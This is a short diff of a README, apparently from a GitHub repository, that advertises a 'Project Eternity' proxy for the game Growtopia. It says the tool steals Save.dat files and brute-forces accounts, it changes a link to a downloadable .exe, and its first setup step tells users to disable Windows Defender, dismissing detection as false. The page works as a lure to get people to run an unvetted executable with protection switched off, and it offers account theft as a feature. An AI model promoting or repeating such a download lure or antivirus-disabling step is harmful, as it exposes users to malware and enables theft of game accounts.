@@ -2,7 +2,7 @@
 
 This is The Copy Of The Real Project Eternity Proxy Of Premium Version Which Is Used To Steal Save.dat File And Brute Force To Enter & Hack In Growtopia!
 
-Download [here](https://github.com/mustleek/Project-Eternity-Growtopia/releases/download/growtopia/Eternity.download.exe)
+Download [here](https://github.com/mustleek/Project-Eternity-Growtopia/releases/download/growtopia/Eternity-download.exe)
 
 ## Setting up Eternity
 1. Disable windows defender (the proxy changes Growtopia code so it gets false detected by antivirus)
